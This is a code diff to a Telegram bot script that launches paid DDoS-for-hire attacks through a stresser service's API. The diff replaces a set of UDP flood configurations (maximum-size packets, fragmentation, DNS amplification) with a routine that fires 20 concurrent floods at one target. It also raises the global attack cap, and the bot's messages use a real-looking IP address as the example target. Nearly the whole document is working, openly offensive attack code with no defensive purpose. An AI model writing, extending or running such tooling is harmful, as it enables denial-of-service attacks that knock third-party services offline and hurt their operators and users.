@@ -1,4 +1,4 @@
-# app.py - UDP Big Packets with 20 Concurrent
+# app.py - 20 Concurrent Attacks on Same Target
 import os
 import logging
 import asyncio
@@ -27,7 +27,7 @@ TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PORT = int(os.getenv("PORT", 8080))
-MAX_CONCURRENT = 20  # Increased to 20
+MAX_CONCURRENT = 20  # 20 concurrent attacks on same target
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -60,12 +60,12 @@ class AttackManager:
         with self.lock:
             user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
             if user_attacks >= MAX_CONCURRENT:
-                return False, f"❌ Concurrent busy: {user_attacks}/{MAX_CONCURRENT}"
-            if len(self.active_attacks) >= 50:
+                return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
+            if len(self.active_attacks) >= 100:
                 return False, "❌ Too many active attacks globally."
             return True, "OK"
     
-    def start_attack(self, user_id, target, port, duration, method):
+    def start_attack(self, user_id, target, port, duration, method, attack_num):
         with self.lock:
             self.attack_counter += 1
             attack_id = self.attack_counter
@@ -78,6 +78,7 @@ class AttackManager:
                 'port': port,
                 'duration': duration,
                 'method': method,
+                'attack_num': attack_num,
                 'start_time': datetime.now(),
                 'status': 'running'
             }
@@ -134,149 +135,98 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== UDP BIG PACKET ATTACK =====
-async def send_udp_big_packet(target, port, duration):
+# ===== UDP BIG PACKET SINGLE ATTACK =====
+async def send_udp_big_packet_single(target, port, duration, attack_num):
     """
-    UDP Attack with BIG PACKETS - Maximum Power
-    Big packets = 65500 bytes (max UDP size)
+    Single UDP Big Packet attack
     """
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Big packet attack configurations - Only UDP
-    attack_configs = [
-        # UDP with maximum packet size
-        {
-            "key": API_KEY,
-            "host": target,
-            "port": port,
-            "time": duration,
-            "method": "udp",
-            "threads": 5000,
-            "pps": 5000000,
-            "bps": 5000000000,
-            "size": 65500,  # Maximum UDP packet size
-            "random": "true",
-            "timeout": 1
-        },
-        # UDP Flood with big packets
-        {
-            "key": API_KEY,
-            "host": target,
-            "port": port,
-            "time": duration,
-            "method": "udp",
-            "threads": 4000,
-            "pps": 4000000,
-            "bps": 4000000000,
-            "size": 65000,
-            "random": "true"
-        },
-        # UDP with fragmentation
-        {
-            "key": API_KEY,
-            "host": target,
-            "port": port,
-            "time": duration,
-            "method": "udp",
-            "threads": 3000,
-            "pps": 3000000,
-            "bps": 3000000000,
-            "size": 65500,
-            "frag": "true",
-            "random": "true"
-        },
-        # UDP Big Packets + Amplification
-        {
-            "key": API_KEY,
-            "host": target,
-            "port": port,
-            "time": duration,
-            "method": "udp",
-            "threads": 2500,
-            "pps": 2500000,
-            "bps": 2500000000,
-            "size": 65500,
-            "amplification": "true",
-            "type": "dns"
-        }
-    ]
+    # UDP with maximum packet size
+    params = {
+        "key": API_KEY,
+        "host": target,
+        "port": port,
+        "time": duration,
+        "method": "udp",
+        "threads": 5000,
+        "pps": 5000000,
+        "bps": 5000000000,
+        "size": 65500,
+        "random": "true",
+        "timeout": 1,
+        "concurrent": str(attack_num)
+    }
     
-    results = []
-    success_count = 0
-    
-    for i, config in enumerate(attack_configs):
-        try:
-            timeout = aiohttp.ClientTimeout(total=duration + 20)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                start_time = time.time()
+    try:
+        timeout = aiohttp.ClientTimeout(total=duration + 15)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            start_time = time.time()
+            async with session.get(url, params=params) as response:
+                elapsed = time.time() - start_time
+                result_text = await response.text()
                 
-                # Try GET first
-                async with session.get(url, params=config) as response:
-                    elapsed = time.time() - start_time
-                    result_text = await response.text()
-                    
-                    is_success = (
-                        response.status == 200 and 
-                        ("SUCCESS" in result_text or 
-                         "sent" in result_text.lower() or
-                         "attack" in result_text.lower() or
-                         "Host:" in result_text)
-                    )
-                    
-                    if is_success:
-                        success_count += 1
-                    
-                    results.append({
-                        'config': i + 1,
-                        'type': 'GET',
-                        'status': response.status,
-                        'elapsed': f"{elapsed:.2f}s",
-                        'success': is_success,
-                        'response': result_text[:300]
-                    })
-                    
-                    logger.info(f"UDP Big Packet {i+1}: Status {response.status}, Success: {is_success}")
-                    
-                    if is_success:
-                        return {
-                            "success": True,
-                            "config_used": i + 1,
-                            "params_used": config,
-                            "status_code": response.status,
-                            "elapsed": f"{elapsed:.2f}s",
-                            "response": result_text[:500],
-                            "full_response": result_text,
-                            "attempts": results,
-                            "packet_size": config.get('size', 65500),
-                            "threads": config.get('threads', 5000)
-                        }
-                    
-                    await asyncio.sleep(0.2)
-                    
-        except Exception as e:
-            logger.error(f"UDP config {i+1} failed: {e}")
-            results.append({
-                'config': i + 1,
-                'success': False,
-                'error': str(e)
-            })
-    
-    # If all failed, return last result
-    if results:
+                is_success = (
+                    response.status == 200 and 
+                    ("SUCCESS" in result_text or 
+                     "sent" in result_text.lower() or
+                     "attack" in result_text.lower() or
+                     "Host:" in result_text)
+                )
+                
+                return {
+                    "success": is_success,
+                    "attack_num": attack_num,
+                    "status": response.status,
+                    "elapsed": f"{elapsed:.2f}s",
+                    "response": result_text[:200],
+                    "full_response": result_text
+                }
+                
+    except Exception as e:
+        logger.error(f"Attack {attack_num} failed: {e}")
         return {
             "success": False,
-            "attempts": results,
-            "message": f"Tried {len(results)} UDP configurations, all failed"
+            "attack_num": attack_num,
+            "error": str(e)
         }
+
+# ===== 20 CONCURRENT ATTACKS =====
+async def send_20_concurrent_attacks(target, port, duration):
+    """
+    Launch 20 concurrent UDP big packet attacks on the same target
+    """
+    logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
     
-    return {"success": False, "error": "No response from API"}
+    # Create 20 attack tasks
+    tasks = []
+    for i in range(1, 21):  # 1 to 20
+        task = send_udp_big_packet_single(target, port, duration, i)
+        tasks.append(task)
+    
+    # Run all attacks concurrently
+    results = await asyncio.gather(*tasks)
+    
+    # Count successes
+    success_count = sum(1 for r in results if r.get('success', False))
+    
+    return {
+        "success": success_count > 0,
+        "total_attacks": len(results),
+        "successful": success_count,
+        "failed": len(results) - success_count,
+        "results": results,
+        "target": target,
+        "port": port,
+        "duration": duration
+    }
 
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     
     keyboard = [
-        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
+        [InlineKeyboardButton("💥 20x UDP ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -285,24 +235,24 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     await update.message.reply_text(
-        f"⚡ *UDP BIG PACKET ATTACK BOT*\n\n"
+        f"⚡ *20x UDP BIG PACKET ATTACK BOT*\n\n"
         f"🔥 Status: ONLINE\n"
         f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📊 Total Attacks: {stats['total']}\n"
         f"📦 Packet Size: 65,500 bytes (MAX)\n"
-        f"💪 Threads: 5,000 per attack\n\n"
+        f"💪 Threads: 5,000 per attack\n"
+        f"🎯 20 Attacks: Simultaneously on SAME target!\n\n"
         f"📌 *How to use:*\n"
         f"`/attack IP PORT TIME`\n\n"
         f"Example: `/attack 91.108.17.19 32001 60`\n\n"
-        f"⏱️ Time: 60-300 seconds\n"
-        f"📡 Method: UDP (Big Packets only)\n"
-        f"⚡ Max Concurrent: 20",
+        f"⚡ This launches 20 concurrent attacks!\n"
+        f"⏱️ Time: 60-300 seconds",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack command - UDP Big Packets only"""
+    """Handle /attack command - Launches 20 concurrent attacks"""
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID:
@@ -314,9 +264,9 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
             "Example: `/attack 91.108.17.19 32001 60`\n\n"
-            "📦 UDP Big Packets (65,500 bytes)\n"
-            "💪 5,000 threads per attack\n"
-            "⚡ 20 concurrent attacks\n"
+            "⚡ This launches 20 concurrent UDP Big Packet attacks!\n"
+            "📦 Packet Size: 65,500 bytes\n"
+            "💪 Threads: 5,000 per attack\n"
             "⏱️ Time: 60-300 seconds",
             parse_mode='Markdown'
         )
@@ -341,23 +291,25 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(msg)
             return
         
-        # Start attack
+        # Start attack - this will launch 20 concurrent attacks
         status_msg = await update.message.reply_text(
-            f"🚀 *UDP BIG PACKET ATTACK STARTED*\n\n"
+            f"🚀 *20x UDP BIG PACKET ATTACK STARTED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
             f"📦 Packet Size: `65,500 bytes`\n"
-            f"💪 Threads: `5,000`\n"
+            f"💪 Threads: `5,000 per attack`\n"
+            f"🎯 Attacks: `20 CONCURRENT`\n"
             f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
-            f"⏳ Sending UDP flood with big packets...",
+            f"⏳ Launching 20 simultaneous attacks...",
             parse_mode='Markdown'
         )
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
+        # Start all 20 attacks
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
         
-        # Send UDP big packet attack
-        result = await send_udp_big_packet(target, port, duration)
+        # Send 20 concurrent attacks
+        result = await send_20_concurrent_attacks(target, port, duration)
         
         # Log attack
         attack_manager.log_attack(
@@ -369,19 +321,19 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Build response
         if result.get('success'):
             response_text = (
-                f"✅ *UDP BIG PACKET ATTACK SUCCESSFUL!*\n\n"
+                f"✅ *20x UDP BIG PACKET ATTACK SUCCESSFUL!*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"📦 Packet Size: `{result.get('packet_size', 65500)} bytes`\n"
-                f"💪 Threads: `{result.get('threads', 5000)}`\n"
+                f"📦 Packet Size: `65,500 bytes`\n"
+                f"💪 Threads: `5,000 each`\n"
+                f"🎯 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ✅ SUCCESS\n"
-                f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n\n"
+                f"⚡ Status: ✅ SUCCESS\n\n"
             )
         else:
             response_text = (
-                f"❌ *UDP BIG PACKET ATTACK FAILED*\n\n"
+                f"❌ *20x UDP BIG PACKET ATTACK FAILED*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
@@ -389,23 +341,23 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⚡ Status: ❌ FAILED\n\n"
             )
         
-        # Add attempts info
-        if result.get('attempts'):
-            attempts = result['attempts']
-            total = len(attempts)
-            successful = sum(1 for a in attempts if a.get('success'))
+        # Show attack results
+        if result.get('results'):
+            response_text += f"📊 *Attack Results:*\n"
+            for r in result['results'][:10]:  # Show first 10
+                status = "✅" if r.get('success') else "❌"
+                attack_num = r.get('attack_num', 'N/A')
+                status_code = r.get('status', 'N/A')
+                response_text += f"{status} Attack {attack_num}: {status_code}\n"
             
-            response_text += f"📊 *Tried {total} UDP configs, {successful} successful*\n\n"
-            
-            # Show last 5 attempts
-            for attempt in attempts[-5:]:
-                status = "✅" if attempt.get('success') else "❌"
-                config_num = attempt.get('config', 'N/A')
-                response_text += f"{status} Config {config_num}: {attempt.get('status', 'N/A')}\n"
+            if len(result['results']) > 10:
+                response_text += f"... and {len(result['results']) - 10} more\n"
         
-        # Add response preview
-        if result.get('response'):
-            response_text += f"\n📡 *API Response:*\n```\n{result['response'][:200]}\n```"
+        # Add response preview from first successful attack
+        for r in result.get('results', []):
+            if r.get('success') and r.get('response'):
+                response_text += f"\n📡 *API Response:*\n```\n{r['response'][:200]}\n```"
+                break
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
         
@@ -423,13 +375,14 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     await query.edit_message_text(
-        "💥 *UDP BIG PACKET ATTACK*\n\n"
+        "💥 *20x UDP BIG PACKET ATTACK*\n\n"
         "Send in this format:\n"
         "`IP PORT TIME`\n\n"
         "Example: `91.108.17.19 32001 60`\n\n"
+        "⚡ This launches 20 concurrent attacks!\n"
         "📦 UDP Big Packets (65,500 bytes)\n"
-        "💪 5,000 threads\n"
-        "⚡ 20 concurrent max\n"
+        "💪 5,000 threads per attack\n"
+        "🎯 All 20 attack SAME target simultaneously\n"
         "⏱️ Time: 60-300 seconds\n\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
@@ -478,19 +431,20 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         status_msg = await update.message.reply_text(
-            f"🚀 UDP Big Packet attack on {target}:{port} for {duration}s..."
+            f"🚀 Launching 20 concurrent attacks on {target}:{port} for {duration}s..."
         )
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
-        result = await send_udp_big_packet(target, port, duration)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        result = await send_20_concurrent_attacks(target, port, duration)
         
         if result.get('success'):
             response_text = (
-                f"✅ *UDP BIG PACKET SUCCESS!*\n\n"
+                f"✅ *20x UDP ATTACK SUCCESS!*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
                 f"📦 Packet: `65,500 bytes`\n"
+                f"🎯 Successful: `{result['successful']}/{result['total_attacks']}`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
             )
         else:
@@ -501,9 +455,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⏱️ Time: `{duration}s`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
             )
-        
-        if result.get('response'):
-            response_text += f"\n📡 Response: {result['response'][:200]}"
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
         attack_manager.stop_attack(attack_id)
@@ -524,7 +475,8 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
         f"📦 Packet Size: 65,500 bytes\n"
-        f"💪 Threads: 5,000\n"
+        f"💪 Threads: 5,000 per attack\n"
+        f"🎯 Attacks per command: 20 CONCURRENT\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
         f"📌 /attack IP PORT TIME",
@@ -560,9 +512,10 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
         f"📦 Packet Size: 65,500 bytes\n"
-        f"💪 Threads: 5,000\n"
+        f"💪 Threads: 5,000 per attack\n"
+        f"🎯 Attacks per command: 20 CONCURRENT\n"
         f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
-        f"📌 *Method:* UDP Big Packets only",
+        f"📌 *Method:* UDP Big Packets x20",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
@@ -616,7 +569,8 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
         f"📦 Packet: 65,500 bytes\n"
-        f"💪 Threads: 5,000\n"
+        f"💪 Threads: 5,000 per attack\n"
+        f"🎯 Attacks/Command: 20 CONCURRENT\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE",
         parse_mode='Markdown',
@@ -630,7 +584,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     
     keyboard = [
-        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
+        [InlineKeyboardButton("💥 20x UDP ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -643,6 +597,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total: {stats['total']}\n"
         f"📦 Packet: 65,500 bytes\n"
+        f"🎯 Attacks: 20 CONCURRENT\n"
         f"🌐 Status: ONLINE",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -686,9 +641,9 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("⚡ UDP BIG PACKET ATTACK BOT")
+    print("⚡ 20x UDP BIG PACKET ATTACK BOT")
     print("📦 Packet Size: 65,500 bytes")
-    print("⚡ Concurrent: 20")
+    print("🎯 20 Concurrent Attacks on SAME Target")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
